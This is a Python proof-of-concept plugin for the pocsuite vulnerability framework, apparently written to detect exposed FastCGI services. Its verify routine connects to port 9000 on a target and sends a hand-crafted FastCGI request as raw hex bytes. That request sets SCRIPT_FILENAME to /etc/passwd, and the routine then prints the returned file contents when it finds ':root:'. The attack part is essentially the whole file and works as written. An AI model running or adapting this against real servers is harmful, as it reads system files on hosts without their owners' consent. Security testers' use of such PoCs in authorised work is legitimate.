#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip



#基础基类
#fastcgi
class fastcgiPOC(POCBase):
    vulID = '39'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-07-9' #漏洞公开的时间,不知道就写今天

    author = 'arr0w1' #  PoC作者的大名
    createDate ='2018-07-9'# 编写 PoC 的日期
    updateDate = '2018-07-9'# PoC 更新的时间,默认和编写时间一样
    references = ['']# 漏洞地址来源,0day不用写
    name = 'fastcgi read file vulnerability'# PoC 名称
    appPowerLink = 'http://fastcgi.com/'# 漏洞厂商主页地址
    appName = 'fastcgi'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'cmd-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    fastcgi read file vulnerability，fastcgi  尝试读文件，该漏洞可执行命令
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['socket'] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass


    def _verify(self):
        ip = self.url.split(':')[1].replace('/', '')
        import socket
        #import psycopg2
        #调用指纹方法
        result={}

        output = Output(self)
        message = ''

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        sock.settimeout(5.0)
        sock.connect((ip, 9000))
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50 
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49 
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f 
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """

        data_s = ''
        for _ in data.split():
            data_s += chr(int(_, 16))
        sock.send(data_s)
        try:
            ret_data = sock.recv(1024)
            if ret_data.find(':root:') > 0:
                print ret_data

                print(ip + 'fastcgi read file vul')
                message = ip + 'fastcgi read file vul'
                result['VerifyInfo'] = {}


                result['VerifyInfo']['url'] = ip
                result['VerifyInfo']['Payload'] = message


                print '%s is vulnerable!' % ip
                return True
            else:
                print '没有发现 :root: 特征字'
                return False

        except Exception as e:
            print 'socket连接失败'
            pass

        sock.close()

        return self.save_output(result)


    #攻击模块
    def _attack(self):
        pass

    #输出报告
    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(fastcgiPOC)